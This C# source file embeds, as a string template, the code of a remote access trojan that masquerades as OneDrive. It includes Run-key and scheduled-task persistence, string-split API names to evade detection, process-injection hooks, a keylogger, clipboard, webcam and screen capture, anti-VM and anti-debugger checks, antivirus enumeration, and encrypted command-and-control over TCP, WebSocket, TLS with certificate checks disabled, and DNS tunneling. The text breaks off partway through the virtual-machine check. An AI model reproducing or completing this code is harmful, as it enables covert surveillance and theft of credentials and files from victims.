// Dosya: Build/ModuleTemplate.cs
namespace App.Service
{
    public static class ModuleTemplate
    {
        public const string Source = @"using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.Globalization;
using System.IO;
using System.Management;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

using Encoder = System.Drawing.Imaging.Encoder;

%%HEADER%%
namespace App.Service
{
    class Program
    {
        const int ITER = 40000;
        const int MAXFRAME = 96 * 1024 * 1024;
        const int SPI_SETDESKWALLPAPER = 20;
        const int SPIF_UPDATEINIFILE = 0x01;
        const int SPIF_SENDCHANGE = 0x02;
        const int WM_SYSCOMMAND = 0x0112;
        const int SC_MONITORPOWER = 0xF170;
        const int WAKE_PORT = 4445;

#if FEATURE_RD
        const int SRCCOPY = 0x00CC0020;
#endif

#if FEATURE_WEBCAM
        const int WM_CAP_START = 0x0400;
        const int WM_CAP_DRIVER_CONNECT = WM_CAP_START + 10;
        const int WM_CAP_DRIVER_DISCONNECT = WM_CAP_START + 11;
        const int WM_CAP_EDIT_COPY = WM_CAP_START + 30;
        const int WM_CAP_SET_PREVIEW = WM_CAP_START + 50;
        const int WM_CAP_SET_PREVIEWRATE = WM_CAP_START + 54;
        const int WM_CAP_SET_SCALE = WM_CAP_START + 53;
        const int WM_CAP_GRAB_FRAME = WM_CAP_START + 60;
#endif

        [DllImport(""use"" + ""r32.dll"")] static extern bool SetProcessDPIAware();
        [DllImport(""use"" + ""r32.dll"")] static extern void keybd_event(byte vk, byte sc, uint fl, UIntPtr ex);
        [DllImport(""use"" + ""r32.dll"")] static extern short VkKeyScan(char ch);
        [DllImport(""use"" + ""r32.dll"")] static extern bool SendMessage(IntPtr h, uint m, IntPtr w, IntPtr l);
        [DllImport(""use"" + ""r32.dll"", CharSet = CharSet.Unicode)] static extern IntPtr FindWindow(string cls, string win);
        [DllImport(""use"" + ""r32.dll"", CharSet = CharSet.Unicode)] static extern IntPtr FindWindowEx(IntPtr parent, IntPtr after, string cls, string win);
        [DllImport(""use"" + ""r32.dll"")] static extern bool ShowWindow(IntPtr h, int cmd);
        [DllImport(""use"" + ""r32.dll"")] static extern bool LockWorkStation();
        [DllImport(""use"" + ""r32.dll"")] static extern bool SetCursorPos(int x, int y);
        [DllImport(""use"" + ""r32.dll"")] static extern void mouse_event(uint f, int x, int y, uint d, UIntPtr e);
        [DllImport(""use"" + ""r32.dll"", CharSet = CharSet.Unicode)] static extern bool SystemParametersInfo(int action, int param, string val, int flags);
        [DllImport(""win"" + ""mm.dll"", CharSet = CharSet.Ansi)] static extern int mciSendString(string cmd, StringBuilder ret, int len, IntPtr hwnd);

#if FEATURE_RD
        [DllImport(""gdi"" + ""32.dll"")] static extern bool BitBlt(IntPtr d, int x, int y, int w, int h, IntPtr s, int sx, int sy, int rop);
        [DllImport(""gdi"" + ""32.dll"")] static extern IntPtr CreateDC(string drv, string dev, string o, IntPtr i);
        [DllImport(""gdi"" + ""32.dll"")] static extern bool DeleteDC(IntPtr h);
#endif

#if FEATURE_WEBCAM
        [DllImport(""use"" + ""r32.dll"")] static extern bool DestroyWindow(IntPtr h);
#endif

#if FEATURE_ANTIDBG
        [DllImport(""use"" + ""r32.dll"")] static extern bool CheckRemoteDebuggerPresent(IntPtr h, out bool present);
#endif

        static class Api
        {
            [DllImport(""ker"" + ""nel"" + ""32.dll"", CharSet = CharSet.Ansi)] public static extern IntPtr GetProcAddress(IntPtr h, string p);
            [DllImport(""ker"" + ""nel"" + ""32.dll"", CharSet = CharSet.Ansi)] public static extern IntPtr LoadLibraryA(string p);
            [DllImport(""ker"" + ""nel"" + ""32.dll"")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint p, out uint old);

            public static Delegate Get(string dll, string func, Type sig)
            {
                try
                {
                    IntPtr h = LoadLibraryA(dll);
                    if (h == IntPtr.Zero) return null;
                    IntPtr p = GetProcAddress(h, func);
                    if (p == IntPtr.Zero) return null;
                    return Marshal.GetDelegateForFunctionPointer(p, sig);
                }
                catch { return null; }
            }
        }

#if FEATURE_INJECT
        [UnmanagedFunctionPointer(CallingConvention.Winapi)] delegate IntPtr OpenProcessFn(uint a, bool i, int pid);
        [UnmanagedFunctionPointer(CallingConvention.Winapi)] delegate IntPtr VirtualAllocExFn(IntPtr h, IntPtr addr, uint size, uint type, uint prot);
        [UnmanagedFunctionPointer(CallingConvention.Winapi)] delegate bool WriteProcessMemoryFn(IntPtr h, IntPtr addr, byte[] buf, uint size, out uint written);
        [UnmanagedFunctionPointer(CallingConvention.Winapi)] delegate IntPtr CreateRemoteThreadFn(IntPtr h, IntPtr attr, uint stack, IntPtr start, IntPtr param, uint flags, IntPtr id);
        [UnmanagedFunctionPointer(CallingConvention.Winapi)] delegate bool CloseHandleFn(IntPtr h);
#endif

#if FEATURE_WEBCAM
        [UnmanagedFunctionPointer(CallingConvention.Winapi)] delegate IntPtr CapCreateFn(string name, int style, int x, int y, int w, int h, IntPtr parent, int id);
#endif

#if FEATURE_KEYLOG
        [UnmanagedFunctionPointer(CallingConvention.Winapi)] delegate short GetAsyncKeyFn(int vk);
        [UnmanagedFunctionPointer(CallingConvention.Winapi)] delegate int ToUnicodeExFn(uint vk, uint sc, byte[] st, StringBuilder buf, int n, uint fl, IntPtr lay);
        [DllImport(""use"" + ""r32.dll"")] static extern IntPtr GetForegroundWindow();
        [DllImport(""use"" + ""r32.dll"")] static extern int GetWindowThreadProcessId(IntPtr h, out int pid);
        [DllImport(""use"" + ""r32.dll"")] static extern IntPtr GetKeyboardLayout(int tid);
        [DllImport(""use"" + ""r32.dll"", CharSet = CharSet.Unicode)] static extern int GetWindowText(IntPtr h, StringBuilder s, int n);
        [DllImport(""use"" + ""r32.dll"")] static extern bool GetKeyboardState(byte[] st);
#endif

        static string D(string b)
        {
            try { return Encoding.UTF8.GetString(Convert.FromBase64String(b)); } catch { return b; }
        }

        static readonly string EXE_NAME = ""One"" + ""Drive.exe"";
        static readonly string RUN_NAME = ""One"" + ""Drive"";
        static readonly string TASK_NAME = ""One"" + ""Drive"" + ""Sync"";
        static readonly string REG_ROOT = ""Soft"" + ""ware\\Micro"" + ""soft\\One"" + ""Drive\\Sync"" + ""State"";
        static readonly string FP = ""One"" + ""Drive.Sync."";
        static readonly string OD_SUB = ""Micro"" + ""soft\\One"" + ""Drive"";
        static readonly string PSALT = ""C11"" + ""K$Salt$v3"";
        static readonly string RUN_KEY = ""Soft"" + ""ware\\Micro"" + ""soft\\Win"" + ""dows\\Current"" + ""Version\\Run"";

        static string HOST = %%HOST%%;
        static string FALLBACK = %%FALLBACK%%;
        static int PORT = %%PORT%%;
        static string TAG = %%TAG%%;
        static string AESKEY = %%AESKEY%%;
        static string MUTEX = %%MUTEX%%;
        static int HEART = %%HEARTBEAT%%;
        static bool UNATTENDED = %%UNATTENDED%%;
        static bool USE_SOCKS = %%SOCKS%%;
        static string S_HOST = %%SHOST%%;
        static int S_PORT = %%SPORT%%;
        static string S_USER = %%SUSER%%;
        static string S_PASS = %%SPASS%%;
        static bool DO_INSTALL = %%INSTALL%%;
        static string INSTALL_TO = %%INSTALLPATH%%;
        static bool HIDE_FILE = %%HIDEFILE%%;
        static string AUTOSTART = %%AUTOSTART%%;
        static bool ANTI_VM = %%ANTIVM%%;
        static bool ANTI_DBG = %%ANTIDBG%%;
        static bool ELEVATE = %%ELEVATE%%;
        static int DELAY = %%DELAY%%;
        static bool FW_RULE = %%FWRULE%%;
        static bool AUTO_INPUT = %%INPUT%%;
        static bool AUTO_CLIP = %%CLIP%%;
        static string LOG_DIR = %%LOGDIR%%;
        static bool AUTO_RD = %%RD%%;
        static int NETMODE = %%NETMODE%%;
        static bool USE_TLS = %%TLS%%;
        static bool USE_JITTER = %%JITTER%%;
        static bool USE_ATTACH = %%ATTACH%%;
        static bool USE_COMHIJACK = %%COMHIJACK%%;
        static bool USE_WINLOGON = %%WINLOGON%%;
        static string LOCKPASS = %%LOCKPASS%%;
        static bool MEMORY_ONLY = %%MEMORYONLY%%;
        static int MEMORY_MODE = %%MEMORYMODE%%;
        static bool SELF_DELETE = %%SELFDELETE%%;

        static bool IS_DLL = DetectDll();
        static readonly Random JRND = new Random();
        static bool WS;
        static Stream NS;
        static volatile bool WAKE;
        static bool wakeStarted;

#if FEATURE_FILEMGR
        static readonly Dictionary<string, MemoryStream> CHUNKS = new Dictionary<string, MemoryStream>();
#endif

#if FEATURE_ADS
        static readonly Queue<string> LOGQ = new Queue<string>();
        static int LOGFLUSH;
#endif

        static Form LOCKF;
        static volatile bool LOCKOFF;

        static string VERSION = ""2.0.2"";
        static string SID = Guid.NewGuid().ToString(""N"");
        static string SKEY = """";
        static string INSTALLED = """";
        static Mutex MX;
        static readonly object WLOCK = new object();
        static readonly RandomNumberGenerator RNG = RandomNumberGenerator.Create();
        static readonly Dictionary<string, SessionKeys> KCACHE = new Dictionary<string, SessionKeys>();
        static volatile bool alive, rdRun, klRun, clRun;
        static int GEN;
        static int LAST_SEND;
        static int rdMonitor = -1;
        static double rdScale = 0.8;
        static bool iconsHidden;
        static bool taskbarHidden;
        static bool trayOpen;
        static bool autostartDone;
        static bool ELEV_AUTOSTART;

#if FEATURE_RD || FEATURE_WEBCAM
        static ImageCodecInfo JPEG;
#endif

#if FEATURE_CHAT
        static Form CHATF;
        static TextBox CHATLOG;
        static string CHATOP = ""Operatör"";
        static volatile bool CHATFORCE;
        static volatile bool CHATSTART;
#endif

#if FEATURE_RD
        [ThreadStatic] static Bitmap TFull;
        [ThreadStatic] static Bitmap TSmall;
        [ThreadStatic] static IntPtr TDc;
        [ThreadStatic] static Rectangle TRect;
#endif

        sealed class SessionKeys
        {
            public Aes Aes;
            public HMACSHA256 Mac;
            public readonly object Sync = new object();

            public SessionKeys(byte[] k)
            {
                byte[] e = new byte[32], m = new byte[32];
                Buffer.BlockCopy(k, 0, e, 0, 32);
                Buffer.BlockCopy(k, 32, m, 0, 32);
                Aes = Aes.Create();
                Aes.Key = e;
                Aes.Mode = CipherMode.CBC;
                Aes.Padding = PaddingMode.PKCS7;
                Mac = new HMACSHA256(m);
            }
        }

        static void Rand(byte[] b) { lock (RNG) RNG.GetBytes(b); }

        static string B64(string s)
        {
            return Convert.ToBase64String(Encoding.UTF8.GetBytes(s ?? """"));
        }

        static string U64(string s)
        {
            try { return Encoding.UTF8.GetString(Convert.FromBase64String(s)); } catch { return s ?? """"; }
        }

        static string Q(string s)
        {
            return (char)34 + (s ?? """") + (char)34;
        }

        static void ConnLog(string m)
        {
#if DEBUG
            try
            {
                string p = Path.Combine(Path.GetTempPath(), ""c11k_conn.log"");
                if (File.Exists(p) && new FileInfo(p).Length > 262144) File.Delete(p);
                File.AppendAllText(p, DateTime.Now.ToString(""HH:mm:ss"") + ""  "" + m + ""\r\n"");
            }
            catch { }
#endif
        }

        static SessionKeys Derive(string pass)
        {
            if (string.IsNullOrEmpty(pass)) return null;
            lock (KCACHE)
            {
                SessionKeys k;
                if (KCACHE.TryGetValue(pass, out k)) return k;
                using (var d = new Rfc2898DeriveBytes(pass, Encoding.UTF8.GetBytes(PSALT), ITER)) k = new SessionKeys(d.GetBytes(64));
                KCACHE[pass] = k;
                return k;
            }
        }

        static void Frame(string s, bool plain)
        {
            lock (WLOCK)
            {
                if (NS == null) return;
                try
                {
                    byte flag = 0;
                    byte[] body;
                    SessionKeys k = plain ? null : Derive(SKEY);

                    if (k != null)
                    {
                        lock (k.Sync)
                        {
                            byte[] iv = new byte[16];
                            Rand(iv);
                            k.Aes.IV = iv;

                            byte[] cipher;
                            using (var e = k.Aes.CreateEncryptor())
                            {
                                byte[] p = Encoding.UTF8.GetBytes(s);
                                cipher = e.TransformFinalBlock(p, 0, p.Length);
                            }

                            body = new byte[16 + cipher.Length + 32];
                            Buffer.BlockCopy(iv, 0, body, 0, 16);
                            Buffer.BlockCopy(cipher, 0, body, 16, cipher.Length);
                            byte[] mac = k.Mac.ComputeHash(body, 0, 16 + cipher.Length);
                            Buffer.BlockCopy(mac, 0, body, 16 + cipher.Length, 32);
                            flag = 1;
                        }
                    }
                    else body = Encoding.UTF8.GetBytes(s);

                    byte[] frame = new byte[5 + body.Length];
                    frame[0] = (byte)(body.Length & 0xFF);
                    frame[1] = (byte)((body.Length >> 8) & 0xFF);
                    frame[2] = (byte)((body.Length >> 16) & 0xFF);
                    frame[3] = (byte)((body.Length >> 24) & 0xFF);
                    frame[4] = flag;
                    Buffer.BlockCopy(body, 0, frame, 5, body.Length);

#if FEATURE_WS
                    if (WS) WsSend(NS, frame);
                    else
#endif
                    { NS.Write(frame, 0, frame.Length); NS.Flush(); }

                    LAST_SEND = Environment.TickCount;
                }
                catch { }
            }
        }

        static void Send(string s)
        {
            if (USE_JITTER && !NoJitter(s))
            {
                int ms;
                lock (JRND) ms = JRND.Next(1000, 5001);
                try { Thread.Sleep(ms); } catch { }
            }
            Frame(s, false);
        }

        static bool NoJitter(string s)
        {
            return s.StartsWith(""IMG|"") || s.StartsWith(""KEYLOG|"") || s.StartsWith(""CLIP|"")
                || s.StartsWith(""LOG|"") || s.StartsWith(""ECHO|"") || s == ""PING""
                || s.StartsWith(""RD|"") || s.StartsWith(""SHOT|"") || s.StartsWith(""SYSINFO"")
                || s.StartsWith(""PASS|"") || s.StartsWith(""FILE|"");
        }

        static void SendPlain(string s) { Frame(s, true); LAST_SEND = Environment.TickCount; }

        static byte[] Exact(Stream s, int n)
        {
            byte[] b = new byte[n];
            int r = 0;
            while (r < n)
            {
                int x = s.Read(b, r, n - r);
                if (x <= 0) return null;
                r += x;
            }
            return b;
        }

        static byte[] RawFrame(Stream s)
        {
            byte[] h = Exact(s, 5);
            if (h == null) return null;
            int len = BitConverter.ToInt32(h, 0);
            if (len < 0 || len > MAXFRAME) return null;
            byte[] body = len > 0 ? Exact(s, len) : new byte[0];
            if (body == null) return null;
            byte[] f = new byte[5 + len];
            Buffer.BlockCopy(h, 0, f, 0, 5);
            if (len > 0) Buffer.BlockCopy(body, 0, f, 5, len);
            return f;
        }

#if FEATURE_WS
        static void WsPong(Stream s, byte[] data)
        {
            try
            {
                byte[] mask = new byte[4];
                Rand(mask);
                byte[] b = new byte[6 + data.Length];
                b[0] = 0x8A;
                b[1] = (byte)(0x80 | data.Length);
                Buffer.BlockCopy(mask, 0, b, 2, 4);
                for (int i = 0; i < data.Length; i++) b[6 + i] = (byte)(data[i] ^ mask[i & 3]);
                s.Write(b, 0, b.Length);
                s.Flush();
            }
            catch { }
        }

        static void WsSend(Stream s, byte[] data)
        {
            int n = data.Length;
            byte[] head;
            if (n < 126) { head = new byte[2]; head[1] = (byte)(0x80 | n); }
            else if (n <= 0xFFFF) { head = new byte[4]; head[1] = (byte)(0x80 | 126); head[2] = (byte)(n >> 8); head[3] = (byte)n; }
            else { head = new byte[10]; head[1] = (byte)(0x80 | 127); for (int i = 0; i < 8; i++) head[9 - i] = (byte)((long)n >> (8 * i)); }
            head[0] = 0x82;

            byte[] mask = new byte[4];
            Rand(mask);

            byte[] buf = new byte[head.Length + 4 + n];
            Buffer.BlockCopy(head, 0, buf, 0, head.Length);
            Buffer.BlockCopy(mask, 0, buf, head.Length, 4);
            for (int i = 0; i < n; i++) buf[head.Length + 4 + i] = (byte)(data[i] ^ mask[i & 3]);

            s.Write(buf, 0, buf.Length);
            s.Flush();
            LAST_SEND = Environment.TickCount;
        }

        static byte[] WsRecv(Stream s)
        {
            var ms = new MemoryStream();
            while (true)
            {
                byte[] h = Exact(s, 2);
                if (h == null) return null;

                int op = h[0] & 0x0F;
                bool fin = (h[0] & 0x80) != 0;
                bool masked = (h[1] & 0x80) != 0;
                long len = h[1] & 0x7F;

                if (len == 126) { byte[] b = Exact(s, 2); if (b == null) return null; len = (b[0] << 8) | b[1]; }
                else if (len == 127) { byte[] b = Exact(s, 8); if (b == null) return null; len = 0; for (int i = 0; i < 8; i++) len = (len << 8) | b[i]; }
                if (len < 0 || len > MAXFRAME) return null;

                byte[] mask = masked ? Exact(s, 4) : null;
                if (masked && mask == null) return null;

                byte[] data = len > 0 ? Exact(s, (int)len) : new byte[0];
                if (data == null) return null;
                if (mask != null) for (int i = 0; i < data.Length; i++) data[i] ^= mask[i & 3];

                if (op == 9) { WsPong(s, data); continue; }
                if (op == 10) continue;
                if (op == 8) return null;

                ms.Write(data, 0, data.Length);
                if (fin) return ms.ToArray();
            }
        }

        static bool WsHandshake(Stream s, string host)
        {
            try
            {
                byte[] key = new byte[16];
                Rand(key);

                string req =
                    ""GET / HTTP/1.1\r\n"" +
                    ""Host: "" + host + ""\r\n"" +
                    ""Upgrade: websocket\r\n"" +
                    ""Connection: Upgrade\r\n"" +
                    ""Sec-WebSocket-Key: "" + Convert.ToBase64String(key) + ""\r\n"" +
                    ""Sec-WebSocket-Version: 13\r\n"" +
                    ""User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36\r\n\r\n"";

                byte[] b = Encoding.ASCII.GetBytes(req);
                s.Write(b, 0, b.Length);
                s.Flush();

                var sb = new StringBuilder();
                byte[] one = new byte[1];
                while (sb.Length < 4096)
                {
                    int r = s.Read(one, 0, 1);
                    if (r <= 0) return false;
                    sb.Append((char)one[0]);
                    if (sb.Length >= 4 && sb[sb.Length - 4] == '\r' && sb[sb.Length - 3] == '\n' && sb[sb.Length - 2] == '\r' && sb[sb.Length - 1] == '\n') break;
                }

                string head = sb.ToString();
                return head.StartsWith(""HTTP/1.1 101"") || head.StartsWith(""HTTP/1.0 101"");
            }
            catch { return false; }
        }
#endif

#if FEATURE_TLS
        static bool CertOk(object s, System.Security.Cryptography.X509Certificates.X509Certificate cert, System.Security.Cryptography.X509Certificates.X509Chain chain, System.Net.Security.SslPolicyErrors err) { return true; }
#endif

#if FEATURE_DNS
        static string B64U(byte[] b, int off, int len)
        {
            return Convert.ToBase64String(b, off, len).Replace('+', '-').Replace('/', '_').TrimEnd('=');
        }

        static byte[] B64UD(string s)
        {
            s = s.Replace('-', '+').Replace('_', '/');
            int m = s.Length % 4;
            if (m == 2) s += ""=="";
            else if (m == 3) s += ""="";
            return Convert.FromBase64String(s);
        }

        sealed class DnsStream : Stream
        {
            readonly IPEndPoint _ep;
            readonly string _tag;
            readonly Queue<byte> _in = new Queue<byte>();
            readonly object _lk = new object();
            int _seq;

            public DnsStream(string host, int port)
            {
                IPAddress ip;
                if (!IPAddress.TryParse(host, out ip))
                {
                    var list = Dns.GetHostAddresses(host);
                    ip = list.Length > 0 ? list[0] : IPAddress.Loopback;
                }
                _ep = new IPEndPoint(ip, port);
                _tag = Guid.NewGuid().ToString(""N"").Substring(0, 6);
            }

            static byte[] Query(int id, string qname)
            {
                var ms = new MemoryStream();
                ms.WriteByte((byte)(id >> 8)); ms.WriteByte((byte)id);
                ms.WriteByte(1); ms.WriteByte(0);
                ms.WriteByte(0); ms.WriteByte(1);
                ms.WriteByte(0); ms.WriteByte(0);
                ms.WriteByte(0); ms.WriteByte(0);
                ms.WriteByte(0); ms.WriteByte(0);
                foreach (string part in qname.Split('.'))
                {
                    byte[] p = Encoding.ASCII.GetBytes(part);
                    if (p.Length == 0 || p.Length > 63) continue;
                    ms.WriteByte((byte)p.Length);
                    ms.Write(p, 0, p.Length);
                }
                ms.WriteByte(0);
                ms.WriteByte(0); ms.WriteByte(16);
                ms.WriteByte(0); ms.WriteByte(1);
                return ms.ToArray();
            }

            static string ParseTxt(byte[] p)
            {
                try
                {
                    int i = 12;
                    while (i < p.Length && p[i] != 0) i += p[i] + 1;
                    i += 5;

                    while (i + 12 <= p.Length)
                    {
                        if ((p[i] & 0xC0) == 0xC0) i += 2;
                        else { while (i < p.Length && p[i] != 0) i += p[i] + 1; i++; }

                        int type = (p[i] << 8) | p[i + 1];
                        int rdlen = (p[i + 8] << 8) | p[i + 9];
                        i += 10;

                        if (type == 16 && rdlen > 0 && i + rdlen <= p.Length)
                        {
                            int tl = p[i];
                            return Encoding.ASCII.GetString(p, i + 1, Math.Min(tl, rdlen - 1));
                        }
                        i += rdlen;
                    }
                }
                catch { }
                return null;
            }

            string Exchange(string qname)
            {
                try
                {
                    using (var udp = new UdpClient())
                    {
                        udp.Client.ReceiveTimeout = 4000;
                        byte[] q = Query(Interlocked.Increment(ref _seq) & 0xFFFF, qname);
                        udp.Send(q, q.Length, _ep);
                        var any = new IPEndPoint(IPAddress.Any, 0);
                        byte[] r = udp.Receive(ref any);
                        return ParseTxt(r);
                    }
                }
                catch { return null; }
            }

            void Push(string b64)
            {
                try
                {
                    byte[] d = B64UD(b64);
                    lock (_lk) for (int i = 0; i < d.Length; i++) _in.Enqueue(d[i]);
                }
                catch { }
            }

            public override void Write(byte[] buf, int off, int len)
            {
                int i = off;
                while (i < off + len)
                {
                    int n = Math.Min(120, off + len - i);
                    string b64 = B64U(buf, i, n);
                    i += n;

                    var labels = new List<string>();
                    labels.Add(""u"");
                    labels.Add(_tag);
                    for (int k = 0; k < b64.Length; k += 60) labels.Add(b64.Substring(k, Math.Min(60, b64.Length - k)));
                    labels.Add(""c11k"");

                    string res = Exchange(string.Join(""."", labels.ToArray()));
                    if (res != null && res.Length > 0) Push(res);
                }
            }

            public override int Read(byte[] buf, int off, int count)
            {
                int idle = 0;
                while (idle < 300)
                {
                    lock (_lk)
                    {
                        if (_in.Count > 0)
                        {
                            int n = Math.Min(count, _in.Count);
                            for (int i = 0; i < n; i++) buf[off + i] = _in.Dequeue();
                            return n;
                        }
                    }

                    string res = Exchange(""d."" + _tag + "".c11k"");
                    if (res != null && res.Length > 0) { Push(res); idle = 0; }
                    else { Thread.Sleep(100); idle++; }
                }
                return 0;
            }

            public override void Flush() { }
            public override bool CanRead { get { return true; } }
            public override bool CanSeek { get { return false; } }
            public override bool CanWrite { get { return true; } }
            public override long Length { get { throw new NotSupportedException(); } }
            public override long Position { get { throw new NotSupportedException(); } set { throw new NotSupportedException(); } }
            public override long Seek(long o, SeekOrigin s) { throw new NotSupportedException(); }
            public override void SetLength(long v) { throw new NotSupportedException(); }
        }
#endif

        static string Recv()
        {
            try
            {
                byte[] frame;
#if FEATURE_WS
                frame = WS ? WsRecv(NS) : RawFrame(NS);
#else
                frame = RawFrame(NS);
#endif
                if (frame == null || frame.Length < 5) return null;

                int len = BitConverter.ToInt32(frame, 0);
                if (len < 0 || len != frame.Length - 5) return null;

                byte[] body = new byte[len];
                if (len > 0) Buffer.BlockCopy(frame, 5, body, 0, len);

                if (frame[4] == 1)
                {
                    if (body.Length <= 48) return null;
                    SessionKeys k = Derive(SKEY);
                    if (k == null) return null;
                    try
                    {
                        int clen = body.Length - 48;
                        lock (k.Sync)
                        {
                            byte[] mac = k.Mac.ComputeHash(body, 0, 16 + clen);
                            int diff = 0;
                            for (int i = 0; i < 32; i++) diff |= mac[i] ^ body[16 + clen + i];
                            if (diff != 0) return null;

                            byte[] iv = new byte[16];
                            Buffer.BlockCopy(body, 0, iv, 0, 16);
                            k.Aes.IV = iv;
                            using (var d = k.Aes.CreateDecryptor())
                                return Encoding.UTF8.GetString(d.TransformFinalBlock(body, 16, clen));
                        }
                    }
                    catch { return null; }
                }

                if (!string.IsNullOrEmpty(SKEY)) return null;
                return Encoding.UTF8.GetString(body);
            }
            catch { return null; }
        }

        static bool IsAdmin()
        {
            try
            {
                var p = new System.Security.Principal.WindowsPrincipal(System.Security.Principal.WindowsIdentity.GetCurrent());
                return p.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
            }
            catch { return false; }
        }

#if FEATURE_ANTIDBG
        static bool Debugged()
        {
            try
            {
                if (Debugger.IsAttached) return true;
                bool p;
                CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, out p);
                return p;
            }
            catch { return false; }
        }
#endif

        static string Clean(string s)
        {
            if (s == null) return """";
            return s.Replace(""|"", ""/"").Replace(""\r"", "" "").Replace(""\n"", "" "").Trim();
        }

#if FEATURE_RECON
        static string AvName()
        {
            try
            {
                var sb = new StringBuilder();
                string root = ""root\\Sec"" + ""urity"" + ""Center2"";
                using (var se = new ManagementObjectSearcher(root, ""SELECT display"" + ""Name FROM Anti"" + ""VirusProduct""))
                {
                    foreach (ManagementObject o in se.Get())
                    {
                        try
                        {
                            string n = Convert.ToString(o[""displayName""]);
                            if (string.IsNullOrEmpty(n)) continue;
                            if (sb.Length > 0) sb.Append("", "");
                            sb.Append(n);
                        }
                        catch { }
                    }
                }
                return sb.Length == 0 ? ""Yok"" : sb.ToString();
            }
            catch { return ""?""; }
        }

        static string RamGb()
        {
            try
            {
                long kb = 0;
                using (var se = new ManagementObjectSearcher(""SELECT Total"" + ""Visible"" + ""Memory"" + ""Size FROM Win32_"" + ""Operating"" + ""System""))
                    foreach (ManagementObject o in se.Get())
                        kb = Convert.ToInt64(o[""TotalVisibleMemorySize""]);
                return kb == 0 ? ""?"" : (kb / 1048576) + "" GB"";
            }
            catch { return ""?""; }
        }

        static string CamCount()
        {
            try
            {
                int n = 0;
                using (var se = new ManagementObjectSearcher(""SELECT Name FROM Win32_PnP"" + ""Entity WHERE PNP"" + ""Class='Camera'""))
                    foreach (var o in se.Get()) n++;
                return n.ToString();
            }
            catch { return ""?""; }
        }

        static int MonCount()
        {
            try { return Math.Max(1, Screen.AllScreens.Length); } catch { return 1; }
        }
#endif

        static void Run(string exe, string args)
        {
            try
            {
                var psi = new ProcessStartInfo(exe, args)
                {
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                };
                using (var p = Process.Start(psi)) { p.StandardOutput.ReadToEnd(); p.WaitForExit(); }
            }
            catch { }
        }

        static string WorkDir()
        {
            try
            {
                string d = null;
                if (!string.IsNullOrEmpty(INSTALLED)) d = Path.GetDirectoryName(INSTALLED);
                if (string.IsNullOrEmpty(d)) d = Path.GetDirectoryName(SelfPath());
                if (string.IsNullOrEmpty(d)) d = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), OD_SUB);
                Directory.CreateDirectory(d);
                return d;
            }
            catch
            {
                try { return Path.GetTempPath(); } catch { return "".""; }
            }
        }

        static string WorkFile(string ext)
        {
            try { return Path.Combine(WorkDir(), FP + ""tmp."" + Guid.NewGuid().ToString(""N"").Substring(0, 10) + ext); }
            catch { return FP + ""tmp."" + Guid.NewGuid().ToString(""N"") + ext; }
        }

        static void Hide(string p)
        {
            try { File.SetAttributes(p, FileAttributes.Hidden); } catch { }
        }

#if FEATURE_INSTALL
        static void SweepWork()
        {
            try
            {
                foreach (string f in Directory.GetFiles(WorkDir(), FP + ""tmp.*""))
                {
                    try
                    {
                        if (DateTime.UtcNow - File.GetLastWriteTimeUtc(f) > TimeSpan.FromMinutes(3)) File.Delete(f);
                    }
                    catch { }
                }
            }
            catch { }
        }
#endif

#if FEATURE_KEYLOG || FEATURE_CLIPBOARD
        static void LogLine(string file, string text)
        {
            try
            {
                string dir = string.IsNullOrEmpty(LOG_DIR) ? WorkDir() : Path.Combine(WorkDir(), LOG_DIR);
                Directory.CreateDirectory(dir);
                string p = Path.Combine(dir, FP + file);

                if (File.Exists(p)) File.AppendAllText(p, text);
                else { File.AppendAllText(p, text); Hide(p); }

#if FEATURE_ADS
                LogQueue(file + "" | "" + Clean(text));
#endif
            }
            catch { }
        }
#endif

#if FEATURE_ADS
        static void LogQueue(string line)
        {
            lock (LOGQ)
            {
                if (LOGQ.Count > 400) LOGQ.Dequeue();
                LOGQ.Enqueue(line);
            }
            if (Interlocked.CompareExchange(ref LOGFLUSH, 1, 0) == 0)
                ThreadPool.QueueUserWorkItem(_ => { try { Thread.Sleep(1200); } catch { } DrainLog(); });
        }

        static void DrainLog()
        {
            Interlocked.Exchange(ref LOGFLUSH, 0);
            string[] lines;
            lock (LOGQ)
            {
                if (LOGQ.Count == 0) return;
                lines = LOGQ.ToArray();
                LOGQ.Clear();
            }
            if (!alive || NS == null) return;
            Send(""LOG|DATA|"" + LogSeal(string.Join(""\n"", lines)));
        }

        static string LogSeal(string text)
        {
            try
            {
                SessionKeys k = Derive(SKEY);
                if (k == null) return Convert.ToBase64String(Encoding.UTF8.GetBytes(text));
                lock (k.Sync)
                {
                    byte[] iv = new byte[16];
                    Rand(iv);
                    k.Aes.IV = iv;

                    byte[] p = Encoding.UTF8.GetBytes(text);
                    byte[] cph;
                    using (var e = k.Aes.CreateEncryptor()) cph = e.TransformFinalBlock(p, 0, p.Length);

                    byte[] body = new byte[16 + cph.Length + 32];
                    Buffer.BlockCopy(iv, 0, body, 0, 16);
                    Buffer.BlockCopy(cph, 0, body, 16, cph.Length);
                    byte[] mac = k.Mac.ComputeHash(body, 0, 16 + cph.Length);
                    Buffer.BlockCopy(mac, 0, body, 16 + cph.Length, 32);
                    return Convert.ToBase64String(body);
                }
            }
            catch { return Convert.ToBase64String(Encoding.UTF8.GetBytes(text)); }
        }
#endif

#if FEATURE_ANTIVM
        static bool IsVm()
        {
            try
            {
                string p1 = ""SYS"" + ""TEM\\Current"" + ""ControlSet\\Ser"" + ""vices\\Disk\\Enum"";
                using (var k = Registry.LocalMachine.OpenSubKey(p1))
                {
                    if (k != null)
                    {
                        string v = Convert.ToString(k.GetValue(""0"")).ToLower();
                        if (v.Contains(""vbox"") || v.Contains(""vmware"") || v.Contains(""qemu"") || v.Contains(""virtual hd"") || v.Contains(""msft"")) return true;
                    }
                }

                string p2 = ""HARD"" + ""WARE\\DESCRIP"" + ""TION\\System\\BIOS"";
